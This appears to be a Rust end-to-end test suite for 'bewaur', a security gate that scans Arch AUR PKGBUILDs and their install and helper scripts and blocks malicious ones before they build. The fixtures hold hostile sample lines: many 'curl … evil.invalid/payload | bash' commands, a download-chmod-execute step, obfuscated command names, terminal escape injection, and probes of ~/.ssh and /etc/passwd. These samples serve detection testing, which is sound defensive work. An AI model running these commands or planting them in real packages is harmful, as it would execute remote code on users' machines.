//! End-to-end coverage for Paru's fail-closed pre-build gate.

use std::fs;
use std::path::PathBuf;
use std::process::{Command, Output};
use std::time::{SystemTime, UNIX_EPOCH};

struct TestTree {
    root: PathBuf,
    build_dir: PathBuf,
}

impl TestTree {
    fn new(name: &str) -> Self {
        let nonce = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let root =
            std::env::temp_dir().join(format!("bewaur-gate-{name}-{}-{nonce}", std::process::id()));
        let build_dir = root.join("build");
        fs::create_dir_all(&build_dir).unwrap();
        Self { root, build_dir }
    }

    fn write_build_file(&self, relative: &str, content: &str) {
        let path = self.build_dir.join(relative);
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(path, content).unwrap();
    }

    fn write_build_bytes(&self, relative: &str, content: &[u8]) {
        let path = self.build_dir.join(relative);
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(path, content).unwrap();
    }

    fn write_config(&self, content: &str) {
        let config_dir = self.root.join("config/bewaur");
        fs::create_dir_all(&config_dir).unwrap();
        fs::write(config_dir.join("config.toml"), content).unwrap();
    }

    fn isolated_command(&self) -> Command {
        let mut command = Command::new(env!("CARGO_BIN_EXE_bewaur"));
        command
            .env("HOME", self.root.join("home"))
            .env("XDG_CONFIG_HOME", self.root.join("config"))
            .env("XDG_CACHE_HOME", self.root.join("cache"))
            .env_remove("SUDO_USER")
            .env_remove("DOAS_USER");
        command
    }

    fn command(&self) -> Command {
        let mut command = self.isolated_command();
        command.args(["gate", "--build-dir"]).arg(&self.build_dir);
        command
    }

    fn approve_command(&self) -> Command {
        let review = self.approval_review();
        assert!(!review.status.success(), "{}", stderr(&review));
        let review_stderr = stderr(&review);
        let digest = review_stderr
            .lines()
            .find_map(|line| {
                line.strip_prefix("bewaur approve: reviewed local source-tree digest ")
            })
            .unwrap_or_else(|| panic!("approval review did not print a digest: {review_stderr}"));

        let mut command = self.isolated_command();
        command
            .args(["approve", "--reviewed", digest, "--build-dir"])
            .arg(&self.build_dir);
        command
    }

    fn approval_review(&self) -> Output {
        self.isolated_command()
            .args(["approve", "--build-dir"])
            .arg(&self.build_dir)
            .output()
            .expect("failed to execute bewaur approval review")
    }
}

impl Drop for TestTree {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.root);
    }
}

fn write_package(tree: &TestTree, pkgbase: &str, package_names: &[&str], pkgbuild: &str) {
    tree.write_build_file("PKGBUILD", pkgbuild);
    let mut srcinfo = format!("pkgbase = {pkgbase}\n");
    for package_name in package_names {
        srcinfo.push_str(&format!("\npkgname = {package_name}\n"));
    }
    tree.write_build_file(".SRCINFO", &srcinfo);
}

fn write_approval_fixture(tree: &TestTree) {
    tree.write_build_file(
        "PKGBUILD",
        "pkgbase=gate-approval\npkgname=gate-approval\npkgver=1\npkgrel=1\nsource=('helper.sh' 'README')\ninstall=gate-approval.install\nprepare() { curl -s https://evil.invalid/payload | bash; }\npackage() { :; }\n",
    );
    tree.write_build_file(
        ".SRCINFO",
        "pkgbase = gate-approval\n\tsource = helper.sh\n\tsource = README\n\npkgname = gate-approval\n\tinstall = gate-approval.install\n",
    );
    tree.write_build_file(
        "gate-approval.install",
        "post_install() { echo installed; }\n",
    );
    tree.write_build_file("helper.sh", "#!/bin/sh\necho helper\n");
    tree.write_build_file("README", "reviewed build input\n");
}

fn run_with_pkgbase(tree: &TestTree, pkgbase: &str) -> Output {
    tree.command()
        .env("PKGBASE", pkgbase)
        .output()
        .expect("failed to execute bewaur gate")
}

fn assert_stdout_is_empty(output: &Output) {
    assert!(
        output.stdout.is_empty(),
        "gate wrote to stdout: {}",
        String::from_utf8_lossy(&output.stdout)
    );
}

fn stderr(output: &Output) -> String {
    String::from_utf8(output.stderr.clone()).unwrap()
}

#[test]
fn gate_allows_trusted_local_pkgbuild_and_keeps_stdout_clean() {
    let tree = TestTree::new("trusted");
    write_package(
        &tree,
        "gate-benign",
        &["gate-benign"],
        "pkgname=gate-benign\npkgver=1\npkgrel=1\narch=('any')\npackage() { :; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-benign");

    assert_stdout_is_empty(&output);
    assert!(output.status.success(), "{}", stderr(&output));
    assert!(stderr(&output).contains("bewaur: gate-benign (trust:"));
}

#[test]
fn gate_allows_ok_local_pkgbuild() {
    let tree = TestTree::new("ok");
    write_package(
        &tree,
        "gate-ok",
        &["gate-ok"],
        "pkgname=gate-ok\npkgver=1\npkgrel=1\nsource=('https://github.com/example/gate-ok/archive/v1.tar.gz')\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n_probe_home=~/.ssh/\npackage() { :; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-ok");

    assert_stdout_is_empty(&output);
    assert!(output.status.success(), "{}", stderr(&output));
    assert!(stderr(&output).contains("Trust: OK"), "{}", stderr(&output));
}

#[test]
fn gate_blocks_malicious_pkgbuild_before_build() {
    let tree = TestTree::new("malicious-pkgbuild");
    write_package(
        &tree,
        "gate-malicious",
        &["gate-malicious"],
        "pkgname=gate-malicious\npkgver=1\npkgrel=1\nprepare() { curl -s https://evil.invalid/payload | bash; }\npackage() { :; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-malicious");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("Trust: MALICIOUS"), "{stderr}");
    assert!(stderr.contains("blocked before build"), "{stderr}");
    assert!(
        stderr.contains("> prepare() { curl"),
        "gate report omitted the matched source line: {stderr}"
    );
}

#[test]
fn gate_blocks_known_june_incident_dependency_without_history_context() {
    let tree = TestTree::new("known-incident-dependency");
    write_package(
        &tree,
        "gate-known-incident",
        &["gate-known-incident"],
        "pkgname=gate-known-incident\npkgver=1\npkgrel=1\nsha256sums=()\nbuild() { bun add js-digest; }\npackage() { :; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-known-incident");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("P-JUNE-2026-JS-IOC"), "{stderr}");
    assert!(stderr.contains("bun add js-digest"), "{stderr}");
    assert!(stderr.contains("blocked before build"), "{stderr}");
}

#[test]
fn gate_blocks_sketchy_pkgbuild_that_the_ad_hoc_scan_command_only_warns_about() {
    let tree = TestTree::new("sketchy-pkgbuild");
    write_package(
        &tree,
        "gate-cryptominer",
        &["gate-cryptominer"],
        include_str!("fixtures/malicious/cryptominer.PKGBUILD"),
    );

    let output = run_with_pkgbase(&tree, "gate-cryptominer");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("Trust: SKETCHY"), "{stderr}");
    assert!(
        stderr.contains("SKETCHY package blocked before build"),
        "{stderr}"
    );
}

#[test]
fn gate_blocks_suspicious_pkgbuild_before_build() {
    let tree = TestTree::new("suspicious-pkgbuild");
    write_package(
        &tree,
        "firefox-fix",
        &["firefox-fix"],
        "pkgname=firefox-fix\npkgver=1\npkgrel=1\n_probe_home=~/.ssh/\n_probe_accounts=/etc/passwd\npackage() { :; }\n",
    );

    let output = run_with_pkgbase(&tree, "firefox-fix");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("Trust: SUSPICIOUS"), "{stderr}");
    assert!(
        stderr.contains("SUSPICIOUS package blocked before build"),
        "{stderr}"
    );
}

#[test]
fn gate_scans_referenced_install_script_in_same_analysis_pass() {
    let tree = TestTree::new("install-script");
    tree.write_build_file(
        "PKGBUILD",
        "pkgname=gate-install\npkgver=1\npkgrel=1\ninstall=gate-install.install\npackage() { :; }\n",
    );
    tree.write_build_file(
        ".SRCINFO",
        "pkgbase = gate-install\n\npkgname = gate-install\n\tinstall = gate-install.install\n",
    );
    tree.write_build_file(
        "gate-install.install",
        "post_install() { curl -s https://evil.invalid/payload | bash; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-install");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("P-INSTALL-PIPE-SHELL"), "{stderr}");
    assert!(stderr.contains("blocked before build"), "{stderr}");
}

#[test]
fn gate_blocks_named_remote_dependency_from_install_script() {
    let tree = TestTree::new("install-script-js-package");
    tree.write_build_file(
        "PKGBUILD",
        "pkgname=gate-install-js\npkgver=1\npkgrel=1\ninstall=gate-install-js.install\npackage() { :; }\n",
    );
    tree.write_build_file(
        ".SRCINFO",
        "pkgbase = gate-install-js\n\npkgname = gate-install-js\n\tinstall = gate-install-js.install\n",
    );
    tree.write_build_file(
        "gate-install-js.install",
        "post_install() { bun add ordinary-remote-package; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-install-js");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("P-INSTALL-NAMED-JS-PACKAGE"), "{stderr}");
    assert!(
        stderr.contains("bun add ordinary-remote-package"),
        "{stderr}"
    );
    assert!(stderr.contains("blocked before build"), "{stderr}");
}

#[test]
fn gate_scans_pkgbuild_install_when_stale_srcinfo_omits_it() {
    let tree = TestTree::new("stale-srcinfo-install");
    write_package(
        &tree,
        "gate-stale-install",
        &["gate-stale-install"],
        "pkgname=gate-stale-install\npkgver=1\npkgrel=1\ninstall=evil.install\npackage() { :; }\n",
    );
    tree.write_build_file(
        "evil.install",
        "post_install() { curl -s https://evil.invalid/payload | bash; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-stale-install");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("P-INSTALL-PIPE-SHELL"), "{stderr}");
    assert!(stderr.contains("blocked before build"), "{stderr}");
}

#[test]
fn gate_scans_install_assignment_with_redirections() {
    let tree = TestTree::new("redirected-install");
    write_package(
        &tree,
        "gate-redirected-install",
        &["gate-redirected-install"],
        "pkgname=gate-redirected-install\npkgver=1\npkgrel=1\ninstall=evil.install 2>/dev/null\npackage() { :; }\n",
    );
    tree.write_build_file(
        "evil.install",
        "post_install() { curl -s https://evil.invalid/payload | bash; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-redirected-install");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    assert!(stderr(&output).contains("P-INSTALL-PIPE-SHELL"));
}

#[test]
fn gate_fails_closed_on_dynamic_pkgbuild_install_assignment() {
    let tree = TestTree::new("dynamic-install");
    tree.write_build_file(
        "PKGBUILD",
        "pkgname=gate-dynamic\n_install_name=gate-dynamic.install\ninstall=\"${_install_name}\"\npackage() { :; }\n",
    );
    tree.write_build_file(
        ".SRCINFO",
        "pkgbase = gate-dynamic\n\npkgname = gate-dynamic\n\tinstall = gate-dynamic.install\n",
    );
    tree.write_build_file(
        "gate-dynamic.install",
        "post_install() { echo installed; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-dynamic");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    assert!(
        stderr(&output).contains("dynamic install assignment"),
        "{}",
        stderr(&output)
    );
}

#[test]
fn gate_scans_utf8_local_source_helpers() {
    let tree = TestTree::new("local-helper");
    tree.write_build_file(
        "PKGBUILD",
        "pkgname=gate-helper\npkgver=1\npkgrel=1\nsource=('helper.sh')\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\npackage() { :; }\n",
    );
    tree.write_build_file(
        ".SRCINFO",
        "pkgbase = gate-helper\n\tsource = helper.sh\n\tsha256sums = 0000000000000000000000000000000000000000000000000000000000000000\n\npkgname = gate-helper\n",
    );
    tree.write_build_file(
        "helper.sh",
        "#!/bin/sh\ncurl -s https://evil.invalid/payload | bash\n",
    );

    let output = run_with_pkgbase(&tree, "gate-helper");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("P-CURL-PIPE"), "{stderr}");
    assert!(stderr.contains("Trust: MALICIOUS"), "{stderr}");
}

#[test]
fn gate_scans_literal_source_array_when_srcinfo_is_stale() {
    let tree = TestTree::new("stale-srcinfo-source");
    write_package(
        &tree,
        "gate-stale-source",
        &["gate-stale-source"],
        "pkgname=gate-stale-source\npkgver=1\npkgrel=1\nsource=('payload.sh')\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\npackage() { :; }\n",
    );
    tree.write_build_file(
        "payload.sh",
        "#!/bin/sh\ncurl -s https://evil.invalid/payload | bash\n",
    );

    let output = run_with_pkgbase(&tree, "gate-stale-source");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("P-CURL-PIPE"), "{stderr}");
    assert!(stderr.contains("blocked before build"), "{stderr}");
}

#[test]
fn gate_scans_literal_sourced_helper_omitted_from_all_source_metadata() {
    let tree = TestTree::new("direct-sourced-helper");
    write_package(
        &tree,
        "gate-direct-source",
        &["gate-direct-source"],
        "pkgname=gate-direct-source\npkgver=1\npkgrel=1\nprepare() { source payload.sh; }\npackage() { :; }\n",
    );
    tree.write_build_file(
        "payload.sh",
        "#!/bin/sh\ncurl -s https://evil.invalid/payload | bash\n",
    );

    let output = run_with_pkgbase(&tree, "gate-direct-source");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("P-CURL-PIPE"), "{stderr}");
    assert!(stderr.contains("blocked before build"), "{stderr}");
}

#[test]
fn gate_scans_control_declared_indexed_and_invoked_helpers() {
    let forms = [
        ("conditional-source", "if source payload.sh; then :; fi"),
        ("indexed-source", "source[0]=payload.sh"),
        ("declared-source", "declare -ra source=('payload.sh')"),
        ("srcdir-command", "$srcdir/payload.sh"),
        ("interpreter-option", "bash -o errexit payload.sh"),
    ];
    for (name, form) in forms {
        let tree = TestTree::new(name);
        let pkgbase = format!("gate-{name}");
        write_package(
            &tree,
            &pkgbase,
            &[&pkgbase],
            &format!(
                "pkgname={pkgbase}\npkgver=1\npkgrel=1\nprepare() {{ {form}; }}\npackage() {{ :; }}\n"
            ),
        );
        tree.write_build_file(
            "payload.sh",
            "#!/bin/sh\ncurl -s https://evil.invalid/payload | bash\n",
        );

        let output = run_with_pkgbase(&tree, &pkgbase);

        assert_stdout_is_empty(&output);
        assert!(!output.status.success(), "{form}: {}", stderr(&output));
        assert!(
            stderr(&output).contains("P-CURL-PIPE"),
            "{form}: {}",
            stderr(&output)
        );
    }
}

#[test]
fn gate_scans_inert_looking_helpers_loaded_as_code() {
    for (name, invocation, helper) in [
        (
            "rcfile-helper",
            "bash --rcfile payload.conf -i",
            "payload.conf",
        ),
        (
            "process-substitution-helper",
            "cat <(bash payload.dat)",
            "payload.dat",
        ),
    ] {
        let tree = TestTree::new(name);
        let pkgbase = format!("gate-{name}");
        tree.write_build_file(
            "PKGBUILD",
            &format!(
                "pkgname={pkgbase}\npkgver=1\npkgrel=1\nsource=('{helper}')\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\nprepare() {{ {invocation}; }}\npackage() {{ :; }}\n"
            ),
        );
        tree.write_build_file(
            ".SRCINFO",
            &format!(
                "pkgbase = {pkgbase}\n\tsource = {helper}\n\tsha256sums = 0000000000000000000000000000000000000000000000000000000000000000\n\npkgname = {pkgbase}\n"
            ),
        );
        tree.write_build_file(
            helper,
            "curl -s https://evil.invalid/payload | bash\n",
        );

        let output = run_with_pkgbase(&tree, &pkgbase);

        assert_stdout_is_empty(&output);
        assert!(!output.status.success(), "{invocation}: {}", stderr(&output));
        assert!(
            stderr(&output).contains("P-CURL-PIPE"),
            "{invocation}: {}",
            stderr(&output)
        );
    }
}

#[test]
fn gate_blocks_later_reassignment_bypass() {
    let tree = TestTree::new("later-reassignment");
    write_package(
        &tree,
        "gate-later-reassignment",
        &["gate-later-reassignment"],
        "pkgname=gate-later-reassignment\npkgver=1\npkgrel=1\nfirst=cu\nsecond=rl\nprepare() { $first$second https://evil.invalid/payload | bash; first=true; second=true; }\npackage() { :; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-later-reassignment");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success(), "{}", stderr(&output));
    let stderr = stderr(&output);
    assert!(stderr.contains("SA-VAR-CONCAT-EXEC"), "{stderr}");
    assert!(stderr.contains("Trust: MALICIOUS"), "{stderr}");
}

#[test]
fn gate_blocks_inert_build_marker_bypass() {
    let tree = TestTree::new("inert-build-marker");
    write_package(
        &tree,
        "gate-inert-build-marker",
        &["gate-inert-build-marker"],
        "pkgname=gate-inert-build-marker\npkgver=1\npkgrel=1\nprepare() { curl -o payload https://evil.invalid/payload; chmod +x payload; ./payload; : \"make\"; }\npackage() { :; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-inert-build-marker");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success(), "{}", stderr(&output));
    let stderr = stderr(&output);
    assert!(
        stderr.contains("SA-BINARY-DOWNLOAD-NOCOMPILE"),
        "{stderr}"
    );
    assert!(stderr.contains("Trust: SKETCHY"), "{stderr}");
}

#[test]
fn gate_blocks_later_and_architecture_specific_source_urls() {
    for (name, source) in [
        (
            "later-source",
            "source=('https://github.com/example/clean.tar.gz')\nsource=('http://192.0.2.1/payload.tar.gz')",
        ),
        (
            "architecture-source",
            "source_x86_64=('http://192.0.2.1/payload.tar.gz')",
        ),
    ] {
        let tree = TestTree::new(name);
        let pkgbase = format!("gate-{name}");
        write_package(
            &tree,
            &pkgbase,
            &[&pkgbase],
            &format!(
                "pkgname={pkgbase}\npkgver=1\npkgrel=1\n{source}\nsha256sums=('SKIP')\npackage() {{ :; }}\n"
            ),
        );

        let output = run_with_pkgbase(&tree, &pkgbase);

        assert_stdout_is_empty(&output);
        assert!(!output.status.success(), "{source}: {}", stderr(&output));
        let stderr = stderr(&output);
        assert!(stderr.contains("P-RAW-IP-URL"), "{source}: {stderr}");
        assert!(stderr.contains("P-HTTP-SOURCE"), "{source}: {stderr}");
        assert!(stderr.contains("Trust: SKETCHY"), "{source}: {stderr}");
    }
}

#[test]
fn gate_visibly_escapes_terminal_controls_in_evidence() {
    let tree = TestTree::new("terminal-controls");
    write_package(
        &tree,
        "gate-terminal-controls",
        &["gate-terminal-controls"],
        "pkgname=gate-terminal-controls\npkgver=1\npkgrel=1\nprepare() { cu\"\"rl https://evil.invalid/payload | ba\"\"sh; }\u{1b}]0;forged\u{7}\npackage() { :; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-terminal-controls");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(!stderr.contains('\u{1b}'), "{stderr:?}");
    assert!(!stderr.contains('\u{7}'), "{stderr:?}");
    assert!(stderr.contains(r"\x1b]0;forged\x07"), "{stderr:?}");
}

#[test]
fn gate_scans_invalid_utf8_helper_bytes_lossily() {
    let tree = TestTree::new("invalid-utf8-helper");
    write_package(
        &tree,
        "gate-invalid-utf8",
        &["gate-invalid-utf8"],
        "pkgname=gate-invalid-utf8\npkgver=1\npkgrel=1\nsource=('payload.sh')\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\npackage() { :; }\n",
    );
    tree.write_build_bytes(
        "payload.sh",
        b"#!/bin/sh\n# invalid byte: \xff\ncurl -s https://evil.invalid/payload | bash\n",
    );

    let output = run_with_pkgbase(&tree, "gate-invalid-utf8");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("P-CURL-PIPE"), "{stderr}");
    assert!(stderr.contains("blocked before build"), "{stderr}");
}

#[test]
fn gate_does_not_treat_install_text_in_data_positions_as_a_file_reference() {
    let tree = TestTree::new("install-data-positions");
    write_package(
        &tree,
        "gate-install-data",
        &["gate-install-data"],
        "pkgname=gate-install-data\npkgver=1\npkgrel=1\ncommands=('install=missing.install')\npackage() { echo 'install=missing.install'; printf '%s' install=missing.install; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-install-data");

    assert_stdout_is_empty(&output);
    assert!(output.status.success(), "{}", stderr(&output));
    assert!(!stderr(&output).contains("cannot resolve install script"));
}

#[test]
fn gate_fails_closed_on_printf_v_install_mutation() {
    let tree = TestTree::new("printf-v-install");
    write_package(
        &tree,
        "gate-printf-v",
        &["gate-printf-v"],
        "pkgname=gate-printf-v\npkgver=1\npkgrel=1\nprintf -v install %s evil.install\npackage() { :; }\n",
    );
    tree.write_build_file("evil.install", "post_install() { :; }\n");

    let output = run_with_pkgbase(&tree, "gate-printf-v");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    assert!(
        stderr(&output).contains("indirect install mutation"),
        "{}",
        stderr(&output)
    );
}

#[test]
fn gate_allows_printf_v_text_after_the_format_argument() {
    let tree = TestTree::new("printf-v-data");
    write_package(
        &tree,
        "gate-printf-data",
        &["gate-printf-data"],
        "pkgname=gate-printf-data\npkgver=1\npkgrel=1\nprintf '%s\\n' -v install\npackage() { :; }\n",
    );

    let output = run_with_pkgbase(&tree, "gate-printf-data");

    assert_stdout_is_empty(&output);
    assert!(output.status.success(), "{}", stderr(&output));
}

#[test]
fn gate_does_not_execute_inert_patch_or_readme_examples_as_shell() {
    let tree = TestTree::new("inert-source-data");
    tree.write_build_file(
        "PKGBUILD",
        "pkgname=gate-inert-data\npkgver=1\npkgrel=1\nsource=('README' 'example.patch')\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000' '1111111111111111111111111111111111111111111111111111111111111111')\npackage() { :; }\n",
    );
    tree.write_build_file(
        ".SRCINFO",
        "pkgbase = gate-inert-data\n\tsource = README\n\tsource = example.patch\n\tsha256sums = 0000000000000000000000000000000000000000000000000000000000000000\n\tsha256sums = 1111111111111111111111111111111111111111111111111111111111111111\n\npkgname = gate-inert-data\n",
    );
    tree.write_build_file(
        "README",
        "documentation example: curl https://evil.invalid/payload | bash\n",
    );
    tree.write_build_file(
        "example.patch",
        "+curl https://evil.invalid/payload | bash\n",
    );

    let output = run_with_pkgbase(&tree, "gate-inert-data");

    assert_stdout_is_empty(&output);
    assert!(output.status.success(), "{}", stderr(&output));
    assert!(!stderr(&output).contains("P-CURL-PIPE"));
}

#[test]
fn gate_does_not_allow_one_permanent_split_package_to_exempt_its_siblings() {
    let tree = TestTree::new("split-permanent-allow");
    write_package(
        &tree,
        "gate-split",
        &["gate-split-cli", "gate-split-docs"],
        "pkgbase=gate-split\npkgname=(gate-split-cli gate-split-docs)\nprepare() { curl -s https://evil.invalid/payload | bash; }\n",
    );
    tree.write_config("[permanent_allow]\npackages = [\"gate-split-cli\"]\n");

    let output = run_with_pkgbase(&tree, "gate-split");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let stderr = stderr(&output);
    assert!(stderr.contains("Trust: MALICIOUS"), "{stderr}");
    assert!(stderr.contains("bewaur approve --build-dir ."), "{stderr}");
}

#[test]
fn gate_honors_an_explicit_permanent_package_base_allowance() {
    let tree = TestTree::new("pkgbase-permanent-allow");
    write_package(
        &tree,
        "gate-split",
        &["gate-split-cli", "gate-split-docs"],
        "pkgbase=gate-split\npkgname=(gate-split-cli gate-split-docs)\n_install_name=missing.install\ninstall=\"${_install_name}\"\nprepare() { curl -s https://evil.invalid/payload | bash; }\n",
    );
    tree.write_config("[permanent_allow]\npackages = [\"gate-split\"]\n");

    let output = run_with_pkgbase(&tree, "gate-split");

    assert_stdout_is_empty(&output);
    assert!(output.status.success(), "{}", stderr(&output));
    let stderr = stderr(&output);
    assert!(
        stderr.contains("package base gate-split has a permanent name-wide allowance"),
        "{stderr}"
    );
    assert!(
        !stderr.contains("Trust:"),
        "permanently allowed tree was scanned: {stderr}"
    );
}

#[test]
fn exact_tree_approval_allows_only_the_fully_loaded_reviewed_inputs() {
    let tree = TestTree::new("exact-tree-approval");
    write_approval_fixture(&tree);

    let before = run_with_pkgbase(&tree, "gate-approval");
    assert!(!before.status.success(), "{}", stderr(&before));
    assert!(stderr(&before).contains("Trust: MALICIOUS"));

    let approved = tree
        .approve_command()
        .output()
        .expect("failed to execute bewaur approve");
    assert_stdout_is_empty(&approved);
    assert!(approved.status.success(), "{}", stderr(&approved));
    assert!(
        stderr(&approved).contains("Approved exact build tree: gate-approval"),
        "{}",
        stderr(&approved)
    );

    let unchanged = run_with_pkgbase(&tree, "gate-approval");
    assert_stdout_is_empty(&unchanged);
    assert!(unchanged.status.success(), "{}", stderr(&unchanged));
    assert!(
        stderr(&unchanged).contains("exact build tree for gate-approval is approved"),
        "{}",
        stderr(&unchanged)
    );
    assert!(
        stderr(&unchanged).contains("Trust: MALICIOUS"),
        "an approval must not suppress the current scan report: {}",
        stderr(&unchanged)
    );

    tree.write_build_file(
        "PKGBUILD",
        "pkgbase=gate-approval\npkgname=gate-approval\npkgver=2\npkgrel=1\nsource=('helper.sh' 'README')\ninstall=gate-approval.install\nprepare() { curl -s https://evil.invalid/payload | bash; }\npackage() { :; }\n",
    );
    let changed = run_with_pkgbase(&tree, "gate-approval");
    assert_stdout_is_empty(&changed);
    assert!(!changed.status.success());
    let changed_stderr = stderr(&changed);
    assert!(
        changed_stderr.contains("build inputs for gate-approval changed since approval"),
        "{changed_stderr}"
    );
    assert!(
        changed_stderr.contains("Trust: MALICIOUS"),
        "{changed_stderr}"
    );
}

#[test]
fn approve_displays_the_current_scan_but_requires_explicit_confirmation() {
    let tree = TestTree::new("approval-confirmation");
    write_approval_fixture(&tree);
    let output = tree.approval_review();

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    let output_stderr = stderr(&output);
    assert!(
        output_stderr.contains("Trust: MALICIOUS"),
        "{output_stderr}"
    );
    assert!(
        output_stderr.contains("approval was not saved")
            && output_stderr.contains("--reviewed sha256:v1:p1:"),
        "{output_stderr}"
    );
    assert!(!tree.root.join("config/bewaur/config.toml").exists());
}

#[test]
fn approval_save_is_bound_to_the_previously_reviewed_digest() {
    let tree = TestTree::new("approval-review-binding");
    write_approval_fixture(&tree);

    let review = tree.approval_review();
    let review_stderr = stderr(&review);
    let reviewed_digest = review_stderr
        .lines()
        .find_map(|line| line.strip_prefix("bewaur approve: reviewed local source-tree digest "))
        .unwrap();

    tree.write_build_file("README", "different tree after review\n");
    let save = tree
        .isolated_command()
        .args(["approve", "--reviewed", reviewed_digest, "--build-dir"])
        .arg(&tree.build_dir)
        .output()
        .unwrap();

    assert!(!save.status.success(), "{}", stderr(&save));
    assert!(
        stderr(&save).contains("reviewed digest does not match the current build tree"),
        "{}",
        stderr(&save)
    );
    assert!(!tree.root.join("config/bewaur/config.toml").exists());
}

#[test]
fn exact_and_permanent_authorizations_can_be_listed_and_revoked_independently() {
    let tree = TestTree::new("approval-management");
    write_approval_fixture(&tree);
    assert!(tree.approve_command().output().unwrap().status.success());

    let permanent = tree
        .isolated_command()
        .args(["allow", "gate-approval", "--forever"])
        .output()
        .unwrap();
    assert!(permanent.status.success(), "{}", stderr(&permanent));

    let listed = tree
        .isolated_command()
        .args(["approvals", "gate-approval"])
        .output()
        .unwrap();
    assert!(listed.status.success(), "{}", stderr(&listed));
    let listing = String::from_utf8(listed.stdout).unwrap();
    assert!(
        listing.contains("exact     gate-approval  sha256:v1:p1:"),
        "{listing}"
    );
    assert!(listing.contains("permanent gate-approval"), "{listing}");

    let revoke_exact = tree
        .isolated_command()
        .args(["revoke", "gate-approval"])
        .output()
        .unwrap();
    assert!(revoke_exact.status.success(), "{}", stderr(&revoke_exact));
    let after_exact = tree
        .isolated_command()
        .args(["approvals", "gate-approval"])
        .output()
        .unwrap();
    let after_exact_listing = String::from_utf8(after_exact.stdout).unwrap();
    assert!(
        !after_exact_listing.contains("exact"),
        "{after_exact_listing}"
    );
    assert!(after_exact_listing.contains("permanent gate-approval"));

    let revoke_permanent = tree
        .isolated_command()
        .args(["revoke", "gate-approval", "--forever"])
        .output()
        .unwrap();
    assert!(
        revoke_permanent.status.success(),
        "{}",
        stderr(&revoke_permanent)
    );
    let gate = run_with_pkgbase(&tree, "gate-approval");
    assert!(!gate.status.success(), "{}", stderr(&gate));
    assert!(stderr(&gate).contains("Trust: MALICIOUS"));
}

#[test]
fn exact_tree_approval_covers_srcinfo_install_and_local_helper_bytes() {
    let mutations = [
        ("srcinfo", ".SRCINFO", "\n# changed metadata\n"),
        (
            "install",
            "gate-approval.install",
            "\n# changed install script\n",
        ),
        ("helper", "helper.sh", "\n# changed helper\n"),
        ("inert-source", "README", "changed inert source\n"),
    ];

    for (name, relative, suffix) in mutations {
        let tree = TestTree::new(name);
        write_approval_fixture(&tree);
        let approved = tree.approve_command().output().unwrap();
        assert!(approved.status.success(), "{name}: {}", stderr(&approved));

        let path = tree.build_dir.join(relative);
        let mut content = fs::read_to_string(&path).unwrap();
        content.push_str(suffix);
        fs::write(path, content).unwrap();

        let output = run_with_pkgbase(&tree, "gate-approval");
        assert!(!output.status.success(), "{name}: {}", stderr(&output));
        assert!(
            stderr(&output).contains("changed since approval"),
            "{name}: {}",
            stderr(&output)
        );
    }
}

#[test]
fn exact_tree_approval_hashes_invalid_utf8_helpers_without_lossy_collisions() {
    let tree = TestTree::new("exact-invalid-utf8");
    write_approval_fixture(&tree);
    tree.write_build_bytes("helper.sh", b"#!/bin/sh\n# byte: \xff\necho helper\n");

    let approved = tree.approve_command().output().unwrap();
    assert!(approved.status.success(), "{}", stderr(&approved));
    let unchanged = run_with_pkgbase(&tree, "gate-approval");
    assert!(unchanged.status.success(), "{}", stderr(&unchanged));

    // Both bytes decode to the same U+FFFD replacement character for scanner
    // text, but the approval fingerprint must still distinguish the raw tree.
    tree.write_build_bytes("helper.sh", b"#!/bin/sh\n# byte: \xfe\necho helper\n");
    let changed = run_with_pkgbase(&tree, "gate-approval");
    assert!(!changed.status.success(), "{}", stderr(&changed));
    assert!(
